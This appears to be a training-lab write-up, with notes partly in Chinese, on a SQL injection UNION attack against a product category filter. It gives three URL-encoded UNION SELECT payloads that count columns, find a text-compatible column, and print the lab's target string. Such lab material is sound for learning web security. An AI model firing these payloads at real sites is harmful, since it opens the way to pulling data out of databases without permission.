# Lab: SQL injection UNION attack, finding a column containing text

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## SQL injection
* 注入點在 `category`
* 題目說要輸出特定的字串，因此需要知道說哪一個 column 是可以在網頁輸出的，先用 NULL 確定有多少個 columns，之後再看哪一個 column 可以輸出
```
// 確認有多少個 columns
payload = Toys+%26+Games%27%20union%20select%20NULL,NULL,NULL%20--%20-
```
```
// 確認哪一個 column 可以輸出在網頁上
payload = Toys+%26+Games%27%20union%20select%20NULL,'1',NULL%20--%20-
```
```
// 輸出題目指定的特殊字串
payload = Toys+%26+Game%27%20union%20select%20NULL,%27CY0A1W%27,NULL%20--%20-
```